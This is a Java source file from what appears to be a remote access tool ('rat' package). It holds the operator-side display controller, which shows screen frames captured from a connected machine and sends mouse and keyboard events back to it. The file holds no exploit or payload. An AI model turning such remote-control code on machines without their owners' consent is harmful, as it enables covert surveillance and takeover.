package de.sogomn.rat.server.gui;

import java.awt.Color;
import java.awt.Graphics2D;
import java.awt.event.MouseEvent;
import java.awt.image.BufferedImage;

import de.sogomn.engine.IKeyboardListener;
import de.sogomn.engine.IMouseListener;
import de.sogomn.engine.Screen;
import de.sogomn.engine.Screen.ResizeBehavior;
import de.sogomn.engine.util.ImageUtils;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.KeyEventPacket;
import de.sogomn.rat.packet.MouseEventPacket;
import de.sogomn.rat.util.FrameEncoder.IFrame;

public final class DisplayController implements ISubController, IMouseListener, IKeyboardListener {
	
	private ServerClient client;
	
	private Screen screen;
	private BufferedImage image;
	
	private static final int SCREEN_WIDTH = 1920 / 2;
	private static final int SCREEN_HEIGHT = 1080 / 2;
	
	public DisplayController(final ServerClient client) {
		this.client = client;
	}
	
	private Screen createScreen(final int width, final int height) {
		final Screen screen = new Screen(width, height);
		final String title = client.connection.getAddress();
		
		screen.setResizeBehavior(ResizeBehavior.KEEP_ASPECT_RATIO);
		screen.setTitle(title);
		screen.setSize(SCREEN_WIDTH, SCREEN_HEIGHT);
		screen.setBackgroundColor(Color.BLACK);
		screen.addMouseListener(this);
		screen.addKeyboardListener(this);
		screen.addListener(g -> {
			g.drawImage(image, 0, 0, null);
		});
		
		return screen;
	}
	
	private void drawToScreenImage(final BufferedImage imagePart, final int x, final int y) {
		final Graphics2D g = image.createGraphics();
		
		ImageUtils.applyHighGraphics(g);
		
		g.drawImage(imagePart, x, y, null);
		g.dispose();
	}
	
	public void updateScreen(final int width, final int height) {
		if (screen == null || screen.getInitialWidth() != width || screen.getInitialHeight() != height || !screen.isOpen()) {
			if (screen != null) {
				screen.close();
			}
			
			screen = createScreen(width, height);
		}
		
		screen.show();
		screen.redraw();
	}
	
	public void showImage(final BufferedImage image) {
		this.image = image;
		
		final int width = image.getWidth();
		final int height = image.getHeight();
		
		updateScreen(width, height);
	}
	
	public void showFrame(final IFrame frame, final int screenWidth, final int screenHeight) {
		if (image == null || image.getWidth() != screenWidth || image.getHeight() != screenHeight) {
			image = new BufferedImage(screenWidth, screenHeight, BufferedImage.TYPE_INT_RGB);
		}
		
		drawToScreenImage(frame.image, frame.x, frame.y);
		updateScreen(screenWidth, screenHeight);
	}
	
	public void showFrames(final IFrame[] frames, final int screenWidth, final int screenHeight) {
		if (image == null || image.getWidth() != screenWidth || image.getHeight() != screenHeight) {
			image = new BufferedImage(screenWidth, screenHeight, BufferedImage.TYPE_INT_RGB);
		}
		
		for (final IFrame frame : frames) {
			drawToScreenImage(frame.image, frame.x, frame.y);
		}
		
		updateScreen(screenWidth, screenHeight);
	}
	
	@Override
	public void userInput(final String actionCommand) {
		//...
	}
	
	@Override
	public void handlePacket(final IPacket packet) {
		//...
	}
	
	@Override
	public void mouseEvent(final int x, final int y, final int button, final boolean flag) {
		final byte type = flag ? MouseEventPacket.PRESS : MouseEventPacket.RELEASE;
		final int buttonEvent;
		
		if (button == MouseEvent.BUTTON1) {
			buttonEvent = MouseEvent.BUTTON1_DOWN_MASK;
		} else if (button == MouseEvent.BUTTON2) {
			buttonEvent = MouseEvent.BUTTON2_DOWN_MASK;
		} else if (button == MouseEvent.BUTTON3) {
			buttonEvent = MouseEvent.BUTTON3_DOWN_MASK;
		} else {
			buttonEvent = MouseEvent.NOBUTTON;
		}
		
		final MouseEventPacket packet = new MouseEventPacket(x, y, buttonEvent, type);
		
		client.connection.addPacket(packet);
	}
	
	@Override
	public void mouseMotionEvent(final int x, final int y, final int modifiers) {
		//...
	}
	
	@Override
	public void mouseWheelEvent(final int x, final int y, final int rotation) {
		//...
	}
	
	@Override
	public void keyboardEvent(final int key, final boolean flag) {
		final byte type = flag ? KeyEventPacket.PRESS : KeyEventPacket.RELEASE;
		final KeyEventPacket packet = new KeyEventPacket(key, type);
		
		client.connection.addPacket(packet);
	}
	
}
